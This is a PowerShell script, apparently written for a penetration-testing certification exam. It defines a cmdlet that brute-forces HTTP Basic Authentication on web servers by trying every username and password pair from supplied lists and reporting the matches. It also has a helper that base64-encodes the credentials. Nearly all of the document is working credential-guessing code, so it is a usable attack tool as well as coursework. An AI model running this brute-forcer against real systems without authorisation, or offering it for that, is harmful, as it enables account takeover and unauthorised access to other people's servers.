## Powershell For Penetration Testers Exam Task 1 - Brute Force Basic Authentication Cmtlet
function Brute-Force-Basic-Authentication
{

<#

.SYNOPSIS
This powershell cmdlet will bruteforce basic authenticaiton which is usally used on web servers. 

.DESCRIPTION
The intent of this script is to iterate over the diffrent usernames and passwords supplied to find a valid combination.

.PARAMETER hostname
The hostname or IP address to brute force against, use the -Hostname switch.

.PARAMETER urn
The urn on the target server that the bruteforce attempts to authenticat against

.PARAMETER usernameList
The list of usernames to use for brute forcing the host, each username should be seperated by a carrige return.

.PARAMETER passwordList
The list of passwords to use for brute forcing the host, each password should be seperated by a carrige return.

.PARAMETER protocol
The protocol to bruteforce basic authentication against, the default is http.

.PARAMETER port
The port that the server is running on to bruteforce. Most webservers are on 80, so this is the default, use -port switch to change this.

.PARAMETER stopOnSuccess
This switch determines if after finding a single succesful authentication then stop trying more combinations.


.EXAMPLE
## Powershell For Penetration Testers Exam Task 1 - Brute Force Basic Authentication Cmtlet
PS C:> . ./1-Brute-Force-Basic-Autentication.ps1
PS C:\> Brute-Force-Basic-Authentication -hostname www.target.com -file index.html -usernameList usernames.txt -passwordList passwords.txt -port 80 -protocol http

.LINK
https://github.com/tubesurf/PSPT

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3237

Technically heavily inspired by:
Stack overflow example by "briantist"
https://stackoverflow.com/questions/27951561/use-invoke-webrequest-with-a-username-and-password-for-basic-authentication-on-t

git account: ahhh, Student ID PSP-3061
http://lockboxx.blogspot.com/2016/01/brute-force-basic-authentication.html

#>

[CmdletBinding()] Param(
    
        [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
        [Alias("host", "IPAddress")]
        [String]
        $hostname,
        
        [Parameter(Mandatory = $false)]
        [String]
        $urn = "",
        [Parameter(Mandatory = $true)]
        [String]
        $usernameList,
        
        [Parameter(Mandatory = $true)]
        [String]
        $passwordList,
        
        [Parameter(Mandatory = $false)]
        [String]
        $port = "80",
        
        [Parameter(Mandatory = $false)]
        [String]
        $stopOnSuccess = "True",
        
        [Parameter(Mandatory = $false)]
        [String]
        $protocol = "http"


    
    )



    # Form the URI to attack
    $uri = $protocol + "://" + $hostname + ':' + $port + "/" + $urn

    # Read the list of usernames
    $usernames = Get-Content $usernameList
    # Check that we actually got any
    if ( $usernames.Count -gt 0){
        Write-Host "[*] Username list read," $usernames.Count " usernames."
    }
    else {
        Write-Host "[-] No usernames read"
        return
    }

    # Read list of passwords
    $passwords = Get-Content $passwordList
    if ($passwords.Count -gt 0){
        Write-Host "[*] Password list read," $passwords.Count " passwords."
    }
    else {
        Write-Host "[-] No passwords read"
        return
    }

    # Just some user output 
    $combinations = $passwords.Count * $usernames.Count
    $attempt = 0
    Write-Host "[*] Combinations to try: " $combinations
    Write-Host "[*] Brute forcing URI: " $uri

    # Loop through the usersnames first
    foreach ($username in $usernames)
    {
        # Now loop through the passwords
        foreach ($password in $passwords){
            try 
            {
                $attempt = $attempt + 1 

                # Need to base64 encode the request and place it in the HTTP header
                $Headers = @{
                    Authorization = Encode-Credentials-Base64 $username $password
                }
                # Attempt the request and if it fails the catch block will output failure
                $content = Invoke-WebRequest -Uri $uri -Headers $Headers

                Write-Host "[+]("$attempt" of "$combinations") Match Username: " $username "`t Password: " $password -ForegroundColor Green
                if( $stopOnSuccess -eq $true){
                    return        
                }
            }
            Catch
            {

                Write-Host "[-]("$attempt" of "$combinations") Failed Username: " $username "`t Password: " $password  
           

            }
        }

    }

}


function Encode-Credentials-Base64
{

    [CmdletBinding()] Param(
        
            [Parameter(Mandatory = $true)]
            [String]
            $username,
            
            [Parameter(Mandatory = $false)]
            [String]
            $password
    )

    # Creates the username and password pair
    $usernameAndPasswordPair = "$($username):$($password)"
    # Carries out the base64 encode
    $encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($usernameAndPasswordPair))
    # Creates the value to add to the harder     
    $basicAuthValue = "Basic $encodedCreds"

    return $basicAuthValue

}